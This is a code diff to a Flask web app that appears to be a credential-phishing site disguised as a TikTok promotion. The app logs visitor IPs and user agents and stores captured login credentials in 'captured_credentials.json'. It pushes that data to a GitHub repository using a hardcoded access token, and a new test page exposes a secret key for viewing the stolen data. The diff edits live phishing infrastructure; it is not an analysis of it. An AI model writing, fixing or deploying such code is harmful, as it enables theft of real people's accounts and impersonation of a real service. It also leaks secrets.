@@ -15,13 +15,13 @@ from github import Github, GithubException
 
 # -------------------- CONFIGURATION --------------------
 # 🔴 REPLACE THIS WITH YOUR NEW VALID GITHUB TOKEN (starts with ghp_)
-GITHUB_TOKEN = "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"
+GITHUB_TOKEN = "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E"
 
 REPO_NAME = "AliHamza-lab/hackme"
 GITHUB_BRANCH = "main"          # change to "master" if needed
 
 VIEW_SECRET = "MySuperSecretKey123!"    # Your secret for viewing data
-PUBLIC_URL = os.environ.get('PUBLIC_URL', '')   # optional, for self‑ping
+PUBLIC_URL = "https://tiktok-promo.onrender.com"   # Your actual Render URL
 
 DATA_FILE = "captured_credentials.json"
 VISITORS_FILE = "visitors.json"
@@ -463,10 +463,10 @@ def index():
     ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0].strip()
     ua = request.headers.get('User-Agent', 'Unknown')
     threading.Thread(target=log_visitor, args=(ip, ua)).start()
-    global PUBLIC_URL
-    if not PUBLIC_URL and request.host_url:
-        PUBLIC_URL = request.host_url.rstrip('/')
-        logger.info(f"Auto-set PUBLIC_URL to {PUBLIC_URL}")
+    public_url = PUBLIC_URL
+    if not public_url and request.host_url:
+        public_url = request.host_url.rstrip('/')
+        logger.info(f"Auto-set PUBLIC_URL to {public_url}")
     return render_template_string(PROMO_HTML)
 
 @app.route('/login', methods=['GET', 'POST'])
@@ -484,7 +484,6 @@ def login():
 @app.route('/guest')
 def guest_login():
     """Allows a user to bypass login and go directly to TikTok."""
-    # Optionally log guest visits
     ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0].strip()
     logger.info(f"👤 Guest user from {ip} continued without login")
     return redirect("https://www.tiktok.com")
@@ -497,6 +496,16 @@ def view_data():
     creds = json.load(open(DATA_FILE)) if os.path.exists(DATA_FILE) else []
     visitors = json.load(open(VISITORS_FILE)) if os.path.exists(VISITORS_FILE) else []
     return {"credentials": creds, "visitors": visitors}
+
+@app.route('/test-view')
+def test_view():
+    return '''
+    <h1>View Data Test Page</h1>
+    <p>Your secret key is: MySuperSecretKey123!</p>
+    <p>Click here to view your data: <a href="/view-data?key=MySuperSecretKey123!">View Captured Data</a></p>
+    <p>Or manually use this URL format:</p>
+    <code>https://tiktok-promo.onrender.com/view-data?key=MySuperSecretKey123!</code>
+    '''
 
 @app.route('/test-github')
 def test_github():
@@ -549,6 +558,7 @@ if __name__ == '__main__':
     port = int(os.environ.get('PORT', 5000))
     if not GITHUB_TOKEN or GITHUB_TOKEN == "YOUR_NEW_GITHUB_TOKEN_HERE":
         logger.warning("⚠️  GitHub token is missing or still a placeholder. Auto-commit will not work.")
-    threading.Thread(target=keep_alive, daemon=True).start()
+    if PUBLIC_URL:
+        threading.Thread(target=keep_alive, daemon=True).start()
     logger.info(f"🚀 Starting on port {port}")
     app.run(host='0.0.0.0', port=port, debug=False)
